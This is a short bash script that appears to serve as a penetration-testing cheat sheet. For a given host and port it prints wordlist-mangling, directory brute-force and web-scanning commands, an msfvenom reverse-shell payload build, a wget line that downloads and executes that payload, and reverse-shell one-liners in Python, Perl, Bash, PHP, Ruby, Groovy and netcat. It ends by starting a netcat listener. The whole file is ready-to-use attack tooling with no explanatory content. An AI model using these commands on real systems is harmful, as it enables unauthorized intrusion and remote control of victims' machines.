#!/bin/bash 

printf "\n"
printf "cewl -d 2 -m 5 -w words.txt http://$1 2>/dev/null;john --wordlist=words.txt --rules:Tuned --stdout > mangled_words.txt"
printf "\n\n"

printf "dirb http://$1"
printf "\n\n"

cat << EOF 
skipfish -YO -o ~/skipfish http://$1
EOF

printf "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > rev_shell"
printf "\n\n"

printf "/usr/bin/wget http://$1:$2/rev_shell -O /dev/shm/rev_shell;chmod 777 /dev/shm/rev_shell;/dev/shm/rev_shell"
printf "\n\n"

printf "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
printf "\n\n"

printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
printf "\n\n"

printf "perl -e 'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
printf "\n\n"

printf "bash -i >& /dev/tcp/$1/$2 0>&1"
printf '\n\n'

printf "php -r '$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
printf "\n\n"

printf "ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
printf "\n\n"

printf "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
printf "\n\n"

printf "nc -e /bin/sh $1 $2"
printf "\n\n"

printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
printf "\n\n"

nc -nlvp $2
